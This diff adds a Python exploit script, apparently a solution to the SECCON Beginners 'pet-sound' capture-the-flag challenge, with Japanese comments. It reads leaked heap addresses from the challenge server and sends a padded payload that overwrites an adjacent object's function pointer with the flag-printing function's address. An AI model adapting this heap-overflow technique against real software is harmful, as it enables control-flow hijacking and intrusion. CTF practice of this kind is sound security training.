@@ -1,0 +1,43 @@
+import socket
+import re
+import struct
+
+HOST = 'pet-sound.challenges.beginners.seccon.jp'
+PORT = 9090
+
+s = socket.create_connection((HOST, PORT))
+
+# バナー全受信
+data = b""
+while b"Input a new cry for Pet A > " not in data:
+    data += s.recv(4096)
+
+print(data.decode())
+
+# アドレスパース
+flag_addr = int(re.search(br"speak_flag.*?: (0x[0-9a-f]+)", data).group(1), 16)
+pet_a     = int(re.search(br"Pet A is allocated at: (0x[0-9a-f]+)", data).group(1), 16)
+pet_b     = int(re.search(br"Pet B is allocated at: (0x[0-9a-f]+)", data).group(1), 16)
+
+# soundフィールドから pet_B->speak までの実オフセット
+offset = (pet_b - pet_a) - 8  # pet_A->sound は pet_A + 0x08
+
+print(f"[+] speak_flag = {hex(flag_addr)}")
+print(f"[+] offset = {offset}")
+
+payload = b"A" * offset + struct.pack("<Q", flag_addr)
+
+# 送信（48バイトになるように）
+s.sendall(payload + b"\n")
+
+# 出力読み取り
+while True:
+    try:
+        res = s.recv(1024)
+        if not res:
+            break
+        print(res.decode(errors="ignore"), end='')
+    except:
+        break
+
+s.close()
